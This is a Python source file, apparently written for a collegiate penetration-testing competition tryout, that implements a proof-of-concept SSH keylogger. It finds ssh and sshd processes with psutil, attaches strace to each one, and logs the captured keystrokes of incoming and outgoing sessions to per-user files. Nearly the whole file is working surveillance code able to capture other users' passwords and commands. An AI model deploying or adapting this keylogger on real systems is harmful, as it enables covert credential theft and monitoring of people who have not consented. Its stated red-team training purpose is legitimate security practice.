"""
Author: Choi 
Description: A PoC ssh session monitoring/keylogging program made for CPTC tryout. 
    This is for personal educational purpose, reference to the tryout materials, and for future 
    red/blue team competition. 

Note: This program does not hide itself, as it was not built for malicious purpose. 
"""

from subprocess import Popen, PIPE
from re import split 
from time import sleep 
import threading 
import re
import os 
import psutil


"""
Name: get_ps
Description: Returns two lists of process objects of ssh or sshd

Return: 
    ( [Process] ) - sshProcessList
    ( [Process] ) - sshdProcessList 
"""
def get_ps():
    sshProcessList = []
    sshdProcessList = []
    
    # Create a Process instance generator through process_iter()
    procs = psutil.process_iter()
    for proc in procs:
        if proc.name() == "ssh":
            sshProcessList.append(proc)
        
        if "sshd" in proc.name():
            if "pts" in proc.cmdline()[0]:
                sshdProcessList.append(proc)

    return sshProcessList, sshdProcessList

"""
Name: check_ps
Description: Constantly checks for ssh or sshd processes
    If a ssh/sshd process is found, start a new keylogger thread for it

Return: None
"""
def check_ps():
    sshProcList,sshdProcList = get_ps()

    for proc in sshProcList:
        if proc.pid not in CURRENT_LIST:
            CURRENT_LIST.append(proc.pid)
            print("[+][SSH] PID:", str(proc.pid), "Logging a new outgoing ssh connection: ", proc.cmdline()[1])
            thread = threading.Thread(target=keylogger_ssh, args=(proc,))
            thread.start()

    for proc in sshdProcList:
        if proc.pid not in CURRENT_LIST:
            CURRENT_LIST.append(proc.pid)
            print("[+][SSHD] PID:", str(proc.pid), "Logging a new incoming sshd connection: ", proc.cmdline()[0])
            thread = threading.Thread(target=keylogger_sshd, args=(proc,))
            thread.start()


"""
Name: keylogger_sshd
Description: A threaded funciton which parses and logs specfic sshd session's keystroke by using 
strace. 

Return: None 
    - This funciton will append the keystrokes into a log file.
"""
def keylogger_sshd(proc):
    pid = proc.pid
    strace = 'strace -s 16384 -p ' + str(proc.pid) + ' -e write'
    keylogger = Popen(strace, shell=True, stdout=PIPE, stderr=PIPE)

    logfile = LOGDIR + "/" + proc.username() + "_" + str(proc.pid) + "_sshd.log"
    logfd = open(logfile, 'a')

    while True:
        keylogger.poll()
        output = keylogger.stderr.readline().decode("utf-8")

        if keylogger.returncode is not None:
            print("[-][SSHD] PID:", pid, "Lost connection ")
            CURRENT_LIST.remove(pid)
            logfd.close()
            break

        if "read(" in output and ", 16384)" in output:
            strokes = re.sub(r'write\(.*, "(.*)", 16384\).*= 1', r'\1', output)
            strokes = strokes.rstrip('\n') 
            
            strokes = replaceSpecial(strokes)
            strokes = strokes.encode().decode('unicode_escape')
            
            logfd.write(strokes)

"""
Name: keylogger_ssh
Description: A threaded funciton which parses and logs specfic outgoing ssh session's keystroke by using 
strace. 

Return: None 
    - This funciton will append the keystrokes into a log file.
"""
def keylogger_ssh(proc):
    pid = proc.pid
    strace = 'strace -s 16384 -p ' + str(proc.pid) + ' -e read'
    keylogger = Popen(strace, shell=True, stdout=PIPE, stderr=PIPE)

    logfile = LOGDIR + "/" + proc.username() + "_" + str(proc.pid) + "_ssh.log"
    logfd = open(logfile, 'a')

    while True:
        # Check if strace ended, and get return code 
        keylogger.poll()
        output = keylogger.stderr.readline().decode("utf-8")

        if keylogger.returncode is not None:
            print("[-][SSH] PID:", pid, "Lost connection ")
            CURRENT_LIST.remove(pid)
            logfd.close()
            break

        if "read(" in output and ", 16384)" in output:
            strokes = re.sub(r'read\(.*, "(.*)", 16384\).*= 1', r'\1', output)
            strokes = strokes.rstrip('\n') 
            
            strokes = replaceSpecial(strokes)
            strokes = strokes.encode().decode('unicode_escape')
            
            logfd.write(strokes)

"""
Name: replaceSpecial 
Description: Replaces special characters from the strace output into an escape character
Parameter:
    - ( str ) char: A single character (string in python) to be replaced, if necessary

Return:
    - ( str ) char: A single character that has been replaced, if necessary. If not, it's is untouched. 
"""
def replaceSpecial(char):  
    if char == "\\177":
        return "\\b"
    elif char == "\\t":
        return "    "
    elif char == "\\r":
        return "\n"
    elif char == " ":
        return " "
    else:
        return char


####
#   Start of Main 
####
if __name__ == "__main__":
    CURRENT_LIST = []
    LOGDIR = os.path.dirname(os.path.realpath(__file__))

    while True:
        check_ps()
        sleep(4)